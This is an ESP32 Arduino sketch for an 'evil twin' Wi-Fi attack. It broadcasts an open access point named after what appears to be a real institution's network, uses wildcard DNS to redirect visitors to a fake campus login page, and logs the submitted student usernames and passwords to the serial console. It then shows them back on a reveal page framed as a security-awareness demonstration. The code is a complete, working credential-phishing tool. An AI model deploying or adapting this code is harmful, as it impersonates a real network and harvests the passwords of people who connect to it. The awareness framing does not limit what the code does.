#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>

const char* ssid = "KPTM-Wifi";
const byte DNS_PORT = 53;
IPAddress localIP(192, 168, 4, 1);
IPAddress gateway(192, 168, 4, 1);
IPAddress subnet(255, 255, 255, 0);

DNSServer dnsServer;
WebServer server(80);

const char LOGIN_PAGE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>University Wi-Fi Authentication</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f1f5f9; color: #1e293b; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .card { background: white; padding: 40px; border-radius: 12px; width: 100%; max-width: 380px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; }
    h2 { margin-bottom: 8px; color: #0f172a; font-size: 22px; }
    p { color: #64748b; font-size: 14px; margin-bottom: 24px; }
    input { width: 100%; box-sizing: border-box; padding: 12px 14px; margin: 8px 0; border-radius: 8px; border: 1px solid #cbd5e1; font-size: 14px; }
    input:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59,130,246,0.15); }
    button { background: #2563eb; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 12px; font-size: 14px; }
    button:hover { background: #1d4ed8; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Campus Guest Portal</h2>
    <p>Sign in using your student credentials to access network services.</p>
    <form action="/capture" method="POST">
      <input type="text" name="username" placeholder="Student ID / Username" required autocomplete="off">
      <input type="password" name="password" placeholder="Password / PIN" required>
      <button type="submit">Sign In & Connect</button>
    </form>
  </div>
</body>
</html>
)rawliteral";

const char REVEAL_TEMPLATE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>UCYSS Security Demonstration</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #090d16;
      color: #f1f5f9;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
      box-sizing: border-box;
    }
    .container {
      background: #111827;
      border: 1px solid #1f2937;
      border-top: 4px solid #38bdf8;
      padding: 30px;
      border-radius: 16px;
      width: 100%;
      max-width: 440px;
      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 10px 10px -5px rgba(56, 189, 248, 0.1);
    }
    .badge {
      display: inline-block;
      background: rgba(56, 189, 248, 0.1);
      color: #38bdf8;
      border: 1px solid rgba(56, 189, 248, 0.3);
      padding: 4px 10px;
      border-radius: 20px;
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: 16px;
    }
    h2 {
      color: #f8fafc;
      margin-top: 0;
      font-size: 22px;
      font-weight: 800;
      letter-spacing: -0.5px;
    }
    p {
      color: #94a3b8;
      font-size: 14px;
      line-height: 1.6;
      margin-bottom: 16px;
    }
    .creds-box {
      background: rgba(239, 68, 68, 0.08);
      border: 1px dashed #ef4444;
      padding: 12px 16px;
      border-radius: 8px;
      margin: 20px 0;
      font-family: monospace;
    }
    .creds-box p {
      color: #fca5a5;
      margin: 4px 0;
      font-size: 13px;
    }
    .footer {
      border-top: 1px solid #1f2937;
      margin-top: 24px;
      padding-top: 16px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 12px;
      color: #64748b;
    }
    .footer b {
      color: #38bdf8;
      letter-spacing: 0.5px;
    }
  </style>
</head>
<body>
  <div class="container">
    <span class="badge">UCYSS Live Simulation</span>
    <h2>You Just Got Evil Twinned!</h2>
    <p>Relax, your data is safe. You just stepped into an educational cybersecurity demonstration by <span style="color: #38bdf8; font-weight: 600;">UCYSS</span>.</p>
    
    <div class="creds-box">
      <p><b>User:</b> %USER%</p>
      <p><b>Pass:</b> %PASS%</p>
    </div>

    <p>If this were a malicious actor outside, these inputs would already be harvested. Always verify SSL certificates on captive portals before entering credentials.</p>

    <div class="footer">
      <span>To shine is to blind others.</span>
      <b>PIXORA BOOTH</b>
    </div>
  </div>
</body>
</html>
)rawliteral";

void handleRoot() {
  server.send_P(200, "text/html", LOGIN_PAGE);
}

void handleCapture() {
  String user = server.hasArg("username") ? server.arg("username") : "Unknown";
  String pass = server.hasArg("password") ? server.arg("password") : "N/A";
  
  // DEBUG: Output captured creds to serial monitor
  Serial.println("\n[!] === CREDENTIALS CAPTURED ===");
  Serial.println("User: " + user);
  Serial.println("Pass: " + pass);
  Serial.println("==============================\n");

  String page = FPSTR(REVEAL_TEMPLATE);
  page.replace("%USER%", user);
  page.replace("%PASS%", pass);

  server.send(200, "text/html", page);
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  WiFi.mode(WIFI_AP);
  WiFi.setSleep(false);
  
  WiFi.softAPConfig(localIP, gateway, subnet);
  WiFi.softAP(ssid, "", 6, false, 4); // Channel 6, max 4 slots
  WiFi.setTxPower(WIFI_POWER_19_5dBm); // Max RF power

  dnsServer.start(DNS_PORT, "*", localIP);

  server.on("/", HTTP_GET, handleRoot);
  server.on("/capture", HTTP_POST, handleCapture);
  server.onNotFound(handleRoot);

  server.begin();
  Serial.println("[+] Evil Twin AP & Dynamic Disclosure Server Initialized.");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}